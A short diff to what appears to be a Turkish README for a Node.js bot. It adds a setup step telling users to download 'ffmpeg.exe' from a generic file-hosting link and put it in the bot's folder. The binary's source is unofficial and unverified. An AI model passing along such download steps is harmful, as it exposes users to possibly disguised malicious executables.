@@ -50,6 +50,11 @@ Terminalde aşağıdaki komutu çalıştırarak botu başlatın:
 node bot.js
 ```
 
+### 4. FFmpeg ayarı
+Aşağıdaki linkten programı indirip botun klasörüne atın
+```bash
+https://dosya.co/s7d18a0rt1ix/ffmpeg.exe.html
+```
 ---
 
 ## Kullanım 📖
